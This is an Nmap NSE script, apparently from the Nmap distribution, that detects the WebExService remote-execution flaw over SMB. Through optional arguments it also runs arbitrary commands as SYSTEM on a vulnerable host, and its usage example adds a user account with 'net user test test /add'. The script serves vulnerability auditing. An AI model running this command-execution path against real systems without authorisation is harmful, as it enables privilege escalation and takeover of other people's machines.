local msrpc = require "msrpc"
local smb = require "smb"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[
Checks whether the WebExService is installed and startable. Unless it's patched,
the WebExService can run a SYSTEM-level command remotely with any user account.

Note: Requires an account.

References:
* https://www.webexec.org
]]

---
-- @usage
-- nmap --script smb-vuln-webexec --script-args smbusername=<username>,smbpass=<password> -p445 <host>
-- nmap --script smb-vuln-webexec --script-args 'smbusername=<username>,smbpass=<password>,webexec_command=net user test test /add' -p445 <host>
--
-- @output
-- | smb-vuln-webexec:
-- |_  Vulnerable: WebExService could be accessed remotely as the given user!
--
-- | smb-vuln-webexec:
-- |   Vulnerable: WebExService could be accessed remotely as the given user!
-- |_  ...and successfully started console command: net user test test /add

author = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","vuln"}

portrule = shortport.port_or_service({445, 139}, "microsoft-ds", "tcp", "open")

action = function(host, port)

  local open_result
  local close_result
  local bind_result
  local result

  local status, smbstate = msrpc.start_smb(host, msrpc.SVCCTL_PATH)
  if(status == false) then
    return nil, stdnse.format_output(false, smbstate)
  end

  status, bind_result = msrpc.bind(smbstate, msrpc.SVCCTL_UUID, msrpc.SVCCTL_VERSION, nil)

  if(status == false) then
    smb.stop(smbstate)
    return nil, stdnse.format_output(false, bind_result)
  end

  -- Open the service manager
  stdnse.debug2("Opening the remote service manager")

  status, open_result = msrpc.svcctl_openscmanagerw(smbstate, host.ip, 0x00000001)

  if(status == false) then
    smb.stop(smbstate)
    return nil, stdnse.format_output(false, open_result)
  end

  open_status, open_service_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], 'webexservice', 0x00010)

  if open_status == false then
    status, close_result = msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
    smb.stop(smbstate)
    if string.match(open_service_result, 'NT_STATUS_SERVICE_DOES_NOT_EXIST') then
      return nil, stdnse.format_output(false, "Not vulnerable: WebExService is not installed")
    elseif string.match(open_service_result, 'NT_STATUS_WERR_ACCESS_DENIED') then
      return nil, stdnse.format_output(false, "Not vulnerable: WebExService could not be accessed by this user")
    end
    return nil, stdnse.format_output(false, "Not vulnerable: WebExService failed to open with an unknown status: " .. open_service_result)
  end

  local output = {}
  table.insert(output, "Vulnerable: WebExService could be accessed remotely as the given user!")

  local webexec_command = stdnse.get_script_args( "webexec_command" )
  if(webexec_command) then
    webexec_command = stdnse.strsplit(" ", "install software-update 1 cmd /c " .. webexec_command)
    status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], webexec_command)
    if(status == false) then
      table.insert(output, "...but failed to start the service: " .. result)
    else
      table.insert(output, "...and successfully started console command: " .. stdnse.get_script_args( "webexec_command" ))
    end
  end

  local webexec_gui_command = stdnse.get_script_args( "webexec_gui_command" )
  if(webexec_gui_command) then
    webexec_gui_command = stdnse.strsplit(" ", "install software-update 1 wmic process call create " .. webexec_gui_command)
    status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], webexec_gui_command)

    if(status == false) then
      table.insert(output, "...but failed to start the service: " .. result)
    else
      table.insert(output, "...and successfully started gui command: " .. stdnse.get_script_args( "webexec_gui_command" ))
    end
  end

  status, close_result = msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
  smb.stop(smbstate)
  return true, stdnse.format_output(true, output)
end
